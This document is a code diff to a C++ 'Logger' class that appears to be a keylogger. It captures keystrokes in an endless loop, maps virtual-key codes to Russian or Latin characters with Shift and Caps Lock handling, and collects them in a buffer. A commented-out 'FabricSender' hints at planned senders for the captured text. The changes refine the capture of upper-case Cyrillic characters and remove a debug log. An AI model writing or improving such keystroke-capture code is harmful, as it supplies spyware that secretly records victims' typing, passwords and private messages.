@@ -28,6 +28,8 @@ Logger* Logger::getInstance()
 void Logger::run()
 {
     Logger* log = Logger::getInstance();
+    /*FabricSender* fabric = new FabricSender();
+    array_senders = fabric->createSenders();*/
     while (true) {
         instance->saver();
     }
@@ -179,8 +181,14 @@ void Logger::saver() {
             case VK_OEM_COMMA:
                 //изменила на русский символ (аналогично остальные)
                 //todo проверка на большую букву! 
-                if (LOWORD(kLayout) == rusLangId)
-                    instance->simbols +=  "б"; 
+                if (LOWORD(kLayout) == rusLangId) {
+                    if (checkUpper()) {
+                        instance->simbols += "Б";
+                    }
+                    else {
+                        instance->simbols += "б";
+                    }
+                }
                 else
                     instance->simbols +=  ",";
                 break;
@@ -270,10 +278,8 @@ void Logger::saver() {
 bool Logger::checkUpper()
 {
     short shiftDown = GetKeyState(VK_SHIFT) & 0x8000;
-    short ctrlToggle = GetKeyState(VK_CAPITAL) & 1;
-    ofstream f("checkupper.txt", ios::app);
-    f << shiftDown << " " << ctrlToggle << endl;
-    return shiftDown && !ctrlToggle || !shiftDown  && ctrlToggle;
+    short capslToggle = GetKeyState(VK_CAPITAL) & 1;
+    return shiftDown && !capslToggle || !shiftDown  && capslToggle;
 }
 
 char Logger::toUpper(char letter) {
